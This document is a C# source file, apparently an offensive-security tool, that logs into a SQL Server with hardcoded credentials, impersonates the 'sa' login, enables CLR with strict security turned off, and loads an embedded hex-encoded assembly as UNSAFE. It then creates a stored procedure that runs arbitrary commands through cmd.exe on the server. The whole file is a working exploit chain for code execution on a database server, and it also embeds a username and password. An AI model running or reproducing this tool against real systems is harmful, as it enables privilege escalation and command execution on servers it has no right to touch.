using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Data.SqlClient;

namespace SqlCustomAssemblyLoad
{
    class Program
    {
        static void Main(string[] args)
        {
            if(args == null || args.Length != 2)
            {
                Console.WriteLine("Usage: " + System.AppDomain.CurrentDomain.FriendlyName + " sqlserver command\n");
                Environment.Exit(0);
            }

            // Variables
            String sqlServer = args[0];
            String database = "master";
            // String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; UID=webapp11; PWD=89543dfGDFGH4d";
            //String cmd = "whoami";
            String cmd = args[1];
            String nameAssembly = "myAssembly";
            String nameProcedure = "cmdExec";
            String commandSql = "execCommand";
            //String file = "c:\\tools\\SqlStoredProcedure.dll";
            String file = "0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a240000000000000050450000648602001bd67cd20000000000000000f00022200b023000000c000000040000000000000000000000200000000000800100000000200000000200000400000000000000060000000000000000600000000200000000000003006085000040000000000000400000000000000000100000000000002000000000000000000000100000000000000000000000000000000000000000400000c8030000000000000000000000000000000000000000000000000000fc290000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000004800000000000000000000002e74657874000000ac0a000000200000000c000000020000000000000000000000000000200000602e72737263000000c80300000040000000040000000e00000000000000000000000000004000004000000000000000000000000000000000000000000000000000000000000000000000000000000000480000000200050014210000e8080000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013300600b500000001000011731000000a0a066f1100000a72010000706f1200000a066f1100000a7239000070028c12000001281300000a6f1400000a066f1100000a166f1500000a066f1100000a176f1600000a066f1700000a26178d17000001251672490000701f0c20a00f00006a731800000aa2731900000a0b281a00000a076f1b00000a0716066f1c00000a6f1d00000a6f1e00000a6f1f00000a281a00000a076f2000000a281a00000a6f2100000a066f2200000a066f2300000a2a1e02282400000a2a00000042534a4201000100000000000c00000076342e302e33303331390000000005006c000000b8020000237e0000240300000004000023537472696e6773000000002407000058000000235553007c0700001000000023475549440000008c0700005c01000023426c6f620000000000000002000001471502000900000000fa013300160000010000001c000000020000000200000001000000240000000f000000010000000100000003000000000077020100000000000600a101310306000e0231030600bf00ff020f00510300000600e70095020600840195020600650195020600f50195020600c10195020600da0195020600140195020600d30012030600b100120306004801950206002f014002060092038e020a00fe00de020a005a0260030e007503ff020a006200de020e00b502ff02060070028e020a002000de020a008e0014000a00e403de020a008600de020600c6020a000600d3020a000000000001000000000001000100010010009b00000041000100010048200000000096003500620001000921000000008618f902060002000000010056000900f90201001100f90206001900f9020a002900f90210003100f90210003900f90210004100f90210004900f90210005100f90210005900f90210006100f90215006900f90210007100f90210007900f90210008900f90206009900f90206009900a7022100a90070001000b1008b032600a9007d031000a9002c021500a900c90315009900b0032c00b900f9023000a100f9023800c9007d003f00d100a50344009900b6034a00e1003d004f00810064024f00a1006d025300d100ef034400d100470006009900990306009900ab0006008100f902060020007b0054012e000b0068002e00130071002e001b0090002e00230099002e002b00b1002e003300b1002e003b00b1002e00430099002e004b00b7002e005300b1002e005b00b1002e006300cf002e006b00f9002e00730006011a000480000001000000000000000000000000009800000004000000000000000000000059002c0000000000040000000000000000000000590014000000000004000000000000000000000059008e02000000000000003c4d6f64756c653e0053797374656d2e494f0053797374656d2e446174610053716c4d65746144617461006d73636f726c696200636d64457865630052656164546f456e640053656e64526573756c7473456e640065786563436f6d6d616e640053716c446174615265636f7264007365745f46696c654e616d65006765745f506970650053716c506970650053716c4462547970650053716c53746f72656450726f63656475726500436c6f736500477569644174747269627574650044656275676761626c6541747472696275746500436f6d56697369626c6541747472696275746500417373656d626c795469746c654174747269627574650053716c50726f63656475726541747472696275746500417373656d626c7954726164656d61726b417474726962757465005461726765744672616d65776f726b41747472696275746500417373656d626c7946696c6556657273696f6e41747472696275746500417373656d626c79436f6e66696775726174696f6e41747472696275746500417373656d626c794465736372697074696f6e41747472696275746500436f6d70696c6174696f6e52656c61786174696f6e7341747472696275746500417373656d626c7950726f6475637441747472696275746500417373656d626c79436f7079726967687441747472696275746500417373656d626c79436f6d70616e794174747269627574650052756e74696d65436f6d7061746962696c697479417474726962757465007365745f5573655368656c6c457865637574650053797374656d2e52756e74696d652e56657273696f6e696e670053716c537472696e6700546f537472696e6700536574537472696e670053716c53746f72656450726f6365647572652e646c6c0053797374656d0053797374656d2e5265666c656374696f6e006765745f5374617274496e666f0050726f636573735374617274496e666f0053747265616d5265616465720054657874526561646572004d6963726f736f66742e53716c5365727665722e536572766572002e63746f720053797374656d2e446961676e6f73746963730053797374656d2e52756e74696d652e496e7465726f7053657276696365730053797374656d2e52756e74696d652e436f6d70696c6572536572766963657300446562756767696e674d6f6465730053797374656d2e446174612e53716c54797065730050726f63657373007365745f417267756d656e747300466f726d6174004f626a6563740057616974466f72457869740053656e64526573756c74735374617274006765745f5374616e646172644f7574707574007365745f52656469726563745374616e646172644f75747075740053716c436f6e746578740053656e64526573756c7473526f77000000003763003a005c00770069006e0064006f00770073005c00730079007300740065006d00330032005c0063006d0064002e00650078006500000f20002f00430020007b0030007d00000d6f00750074007000750074000000376ce43a6c2cc7478d96be2b3439077400042001010803200001052001011111042001010e0420010102060702124d125104200012550500020e0e1c03200002072003010e11610a062001011d125d0400001269052001011251042000126d0320000e05200201080e08b77a5c561934e0890500010111490801000800000000001e01000100540216577261704e6f6e457863657074696f6e5468726f7773010801000200000000001701001253716c53746f72656450726f636564757265000005010000000017010012436f7079726967687420c2a920203230323200002901002433393639326165312d643566352d346239322d613265302d31366233346131666461353100000c010007312e302e302e3000004d01001c2e4e45544672616d65776f726b2c56657273696f6e3d76342e372e320100540e144672616d65776f726b446973706c61794e616d65142e4e4554204672616d65776f726b20342e372e320401000000000000000000004e46cefb000000000200000078000000342a0000340c00000000000000000000000000001000000000000000000000000000000052534453eefb826ab6c58f4b9a131ec0b44de048010000005a3a5c6f7365705c636f64655f7265706f735c53716c53746f72656450726f6365647572655c53716c53746f72656450726f6365647572655c6f626a5c7836345c52656c656173655c53716c53746f72656450726f6365647572652e7064620000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000006c03000000000000000000006c0334000000560053005f00560045005200530049004f004e005f0049004e0046004f0000000000bd04effe00000100000001000000000000000100000000003f000000000000000400000002000000000000000000000000000000440000000100560061007200460069006c00650049006e0066006f00000000002400040000005400720061006e0073006c006100740069006f006e00000000000000b004cc020000010053007400720069006e006700460069006c00650049006e0066006f000000a802000001003000300030003000300034006200300000001a000100010043006f006d006d0065006e007400730000000000000022000100010043006f006d00700061006e0079004e0061006d00650000000000000000004e0013000100460069006c0065004400650073006300720069007000740069006f006e0000000000530071006c00530074006f00720065006400500072006f0063006500640075007200650000000000300008000100460069006c006500560065007200730069006f006e000000000031002e0030002e0030002e00300000004e001700010049006e007400650072006e0061006c004e0061006d0065000000530071006c00530074006f00720065006400500072006f006300650064007500720065002e0064006c006c00000000004800120001004c006500670061006c0043006f007000790072006900670068007400000043006f0070007900720069006700680074002000a90020002000320030003200320000002a00010001004c006500670061006c00540072006100640065006d00610072006b00730000000000000000005600170001004f0072006900670069006e0061006c00460069006c0065006e0061006d0065000000530071006c00530074006f00720065006400500072006f006300650064007500720065002e0064006c006c0000000000460013000100500072006f0064007500630074004e0061006d00650000000000530071006c00530074006f00720065006400500072006f0063006500640075007200650000000000340008000100500072006f006400750063007400560065007200730069006f006e00000031002e0030002e0030002e003000000038000800010041007300730065006d0062006c0079002000560065007200730069006f006e00000031002e0030002e0030002e0030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";

            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("[+] Auth success");
            }
            catch
            {
                Console.WriteLine("[!] Auth failed");
                Environment.Exit(0);
            }

            // Get system user
            try
            {
                String querysyslogin = "SELECT SYSTEM_USER;";
                SqlCommand sysusercommand = new SqlCommand(querysyslogin, con);
                SqlDataReader sysuserreader = sysusercommand.ExecuteReader();
                sysuserreader.Read();
                Console.WriteLine("[+] Logged in as: " + sysuserreader[0]);
                sysuserreader.Close();
            }
            catch
            {
                Console.WriteLine("[!] Error selecting system user");
                con.Close();
                Environment.Exit(0);
            }
            
            // Get current user
            try
            {
                String queryuserlogin = "SELECT CURRENT_USER;";
                SqlCommand usercommand = new SqlCommand(queryuserlogin, con);
                SqlDataReader userreader = usercommand.ExecuteReader();
                userreader.Read();
                Console.WriteLine("[+] Mapped to the user: " + userreader[0]);
                userreader.Close();
            }
            catch
            {
                Console.WriteLine("[!] Error selecting current user");
                con.Close();
                Environment.Exit(0);
            }
            
            // Find public role membership
            try
            {
                String querypublicrole = "SELECT IS_SRVROLEMEMBER('public');";
                SqlCommand publiccommand = new SqlCommand(querypublicrole, con);
                SqlDataReader publicreader = publiccommand.ExecuteReader();
                publicreader.Read();
                Int32 publicRole = Int32.Parse(publicreader[0].ToString());
                publicreader.Close();
            }
            catch
            {
                Console.WriteLine("[!] Error selecting role membership");
                con.Close();
                Environment.Exit(0);
            }

            // Find sysadmin role membership
            try
            {
                String querysysadminrole = "SELECT IS_SRVROLEMEMBER('sysadmin');";
                SqlCommand sysadmincommand = new SqlCommand(querysysadminrole, con);
                SqlDataReader sysadminreader = sysadmincommand.ExecuteReader();
                sysadminreader.Read();
                Int32 sysadminRole = Int32.Parse(sysadminreader[0].ToString());
                sysadminreader.Close();
            }
            catch
            {
                Console.WriteLine("[!] Error selecting sysadmin role membership");
                con.Close();
                Environment.Exit(0);
            }

            // SQL Commandstrings
            String impersonatedUser = "EXECUTE AS LOGIN = 'sa';";
            String enable_clr = "use msdb; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled', 1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE;";
            String dropAssembly = "DROP ASSEMBLY IF EXISTS " + nameAssembly + ";";
            String dropProcedure = "DROP PROCEDURE IF EXISTS [dbo].[" + nameProcedure + "];";
            String createAssembly = "CREATE ASSEMBLY "+ nameAssembly + " FROM " + file + " WITH PERMISSION_SET = UNSAFE;";
            String createProcedure = "CREATE PROCEDURE [dbo].[" + nameProcedure + "] @" + commandSql + " NVARCHAR (4000) AS EXTERNAL NAME [" + nameAssembly + "].[StoredProcedure].[" + nameProcedure + "];";
            String invokeProcedure = "EXEC " + nameProcedure + " '" + cmd + "'";

            // Impersonate
            try
            {
                SqlCommand command = new SqlCommand(impersonatedUser, con);
                SqlDataReader reader = command.ExecuteReader();
                reader.Close();
            }
            catch
            {
                Console.WriteLine("[!] Error impersonating");
                con.Close();
                Environment.Exit(0);
            }


            // Enable CLR
            try
            {
                SqlCommand command = new SqlCommand(enable_clr, con);
                SqlDataReader reader = command.ExecuteReader();
                reader.Close();
            }
            catch
            {
                Console.WriteLine("[!] Error enabling CLR");
                con.Close();
                Environment.Exit(0);
            }

            try
            {
                // Drop procedure if it exists
                SqlCommand command = new SqlCommand(dropProcedure, con);
                SqlDataReader reader = command.ExecuteReader();
                reader.Close();

                // Drop assembly if it exists
                command = new SqlCommand(dropAssembly, con);
                reader = command.ExecuteReader();
                reader.Close();

                // Create assembly from file
                command = new SqlCommand(createAssembly, con);
                reader = command.ExecuteReader();
                reader.Close();

                // Create stored procedure
                command = new SqlCommand(createProcedure, con);
                reader = command.ExecuteReader();
                reader.Close();
            }
            catch
            {
                Console.WriteLine("[!] Error manipulating procedures");
                con.Close();
                Environment.Exit(0);
            }

            // Invoke procedure
            try
            {
                SqlCommand command = new SqlCommand(invokeProcedure, con);
                SqlDataReader reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("[*] Result of command is: " + reader[0]);
                reader.Close();
            }
            catch
            {
                Console.WriteLine("[!] Error invoking procedure");
                con.Close();
                Environment.Exit(0);
            }

            con.Close();
        }
    }
}
